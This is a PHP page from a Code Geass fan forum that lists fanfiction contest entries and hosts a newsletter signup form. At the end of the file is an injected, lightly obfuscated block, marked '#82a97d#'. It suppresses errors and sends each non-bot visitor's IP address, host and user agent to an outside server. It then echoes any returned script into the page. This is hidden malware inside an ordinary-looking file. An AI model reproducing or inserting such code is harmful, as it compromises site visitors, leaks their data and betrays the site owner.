<?php
$dir = '../';
include('fanfictionCode.php');

$text = '<p>Once upon a time, our forum had a writing contest to determine who 
would be the best writer. One of our members came up with this idea, and The Emperor 
liked it, so he implemented a writingcontest. The contest is over and the winner 
has been decided, but we decided to keep the submitted entries and put them on the 
website for display.</p>

<p>If you have some time to kill, then browse our fanfiction section and sit 
back, relax, and begin reading!</p>

<p>Our currently featured entries are below.  </p>';

echo div($text);
 
$fanfic = "<h3><a href='documents/MCM.doc'>Code Geass Gaiden - Uso-tsuki Antonio</a></h3>
<p>By MCM38</p>

<p>&nbsp;</p>

<h3><a href='emperor.php'>CC's Past: The Rise of EE</a></h3><p>By The Jade Emperor</p>
<p>&nbsp;</p>

<h3><a href='luna.php'>Code Wolf</a></h3><p>By Kozuki Luna</p>

<p>&nbsp;</p>

<h3><a href='pride.php'>The Shaping of a Life</a></h3><p>By Pride</p>

<p>&nbsp;</p>

<h3><a href='digimon_dreamer.php'>Code Geass Oneshot</a></h3><p>By Digimon Dreamer</p>

<p>&nbsp;</p>

<h3><a href='kidariko.php'>Yugioh and the 7 Guardians - Area 11</a></h3><p>Kidariko</p>";
echo div($fanfic); 
?>

<div class="moduleBlack"><h2>Anime Newsletter - Stay Informed</h2><div  style="padding: 5px;">
<p>Fellow fan,</p>
<p>Are you <span>excited</span> about Code Geass R3? Can't wait to find out when it comes out?</p>
<p>Then <span>subscribe</span> to our newsletter and receive the latest updates from the anime world. 
 Subscribe now to stay informed.</p>
<p>&nbsp;</p>

<center>
	<fieldset style="width: 400px">
	<form method="post" action="http://www.trafficwave.net/cgi-bin/autoresp/inforeq.cgi">
	<table><tr valign=top>
		<td>Full Name <br><br></td>
		<td><input type="text" id="da_name" name="da_name" class="input" size="35"></td>
	</tr><tr>
		<td>Email <br><br></td>
		<td><input type=text id="da_email" name="da_email" class="input" size="35"></td>
	</tr><tr>
		<td align=center colspan="2"><p>&nbsp;</p>
		<input type="submit" width="180px" value=" Subscribe Now! " id="submit" name="subscribe">
		<input type=reset name=reset value=" Clear Form ">
		<input type=hidden name="trwvid" value="theemperor">
		<input type=hidden name="series" value="animeforum">
		<input type=hidden name="subscrLandingURL" value="http://codegeass.us/forum">
		<input type=hidden name="confirmLandingURL" value="http://codegeass.us/forum">
	</td></tr></table>
	</form></fieldset>
</center>
</div></div>

<? 
echo randomStuff(); 
include($dir.'include/bottom.php'); ?>
<?php
#82a97d#
error_reporting(0); ini_set('display_errors',0); $wp_e0270 = @$_SERVER['HTTP_USER_AGENT'];
if (( preg_match ('/Gecko|MSIE/i', $wp_e0270) && !preg_match ('/bot/i', $wp_e0270))){
$wp_e090270="http://"."template"."class".".com/class"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_e0270);
$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_e090270);
curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_0270e = curl_exec ($ch); curl_close($ch);}
if ( substr($wp_0270e,1,3) === 'scr' ){ echo $wp_0270e; }
#/82a97d#
?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>